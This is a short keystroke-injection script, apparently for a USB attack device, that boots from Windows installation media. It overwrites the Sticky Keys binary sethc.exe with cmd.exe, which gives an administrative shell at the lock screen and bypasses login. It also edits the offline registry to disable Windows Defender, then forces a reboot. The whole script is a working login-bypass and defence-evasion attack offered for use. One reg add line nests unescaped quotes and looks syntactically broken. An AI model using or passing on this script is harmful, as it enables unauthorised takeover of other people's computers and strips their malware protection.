// This program is used in addition to a Windows Installation Media
// It replaces the Sticky Keys prompt with an administrative command prompt,
// even on the lock screen. Can be used to bypass any Windows user login screen and much more
// After reboot, press shift five times rapidly to activate "Sticky Keys"




layout('us'); // Keyboard layout
typingSpeed(20,0) // Typing speed, random speed +/-
delay(1000) // Initial delay for use with the TriggerActions templates
press("SHIFT F10")
delay(100)


type("copy c:\\windows\\system32\\sethc.exe c:\\ \n") // Everything is double backslashed to escape HIDScript syntax handling
delay(20)
type("copy /y c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\sethc.exe \n") // This overwrites the Sticky Keys program that we just backed up
delay(20)

//the following lines disable Windows Defender's AccessibilityEscalation warning, if applicable
type("reg load HKLM\\temp-hive c:\\windows\\system32\\config\\SOFTWARE \n")
delay(20)
type("reg add "HKLM\\temp-hive\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f \n")
delay(20)
type("reg unload HKLM\\temp-hive \n")
delay(50)
type("shutdown /r /f \n")
